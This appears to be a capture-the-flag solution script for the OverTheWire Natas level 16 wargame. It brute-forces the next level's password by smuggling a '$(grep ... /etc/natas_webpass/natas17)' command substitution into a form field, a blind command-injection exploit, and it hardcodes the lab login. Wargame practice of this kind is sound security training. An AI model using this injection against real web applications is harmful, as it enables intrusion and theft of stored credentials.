#!/usr/bin/python3
import requests
import string
username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

charachters = string.ascii_uppercase+string.ascii_lowercase+string.digits

secret = ""
while len(secret) != len(password):
    for ch in charachters:
        #print("Trying " + secret+ch)
        url = 'http://'+username+'.natas.labs.overthewire.org/'
        session = requests.session()
        data = {"needle":"anythings$(grep ^"+secret+ch+" /etc/natas_webpass/natas17)"}
        response = session.post(url,data = data ,auth = (username, password))
        content = response.text
        #print(content)
        if "anythings" not in content:
            secret = secret + ch
            break
print("Password for natas17 is: "+secret)
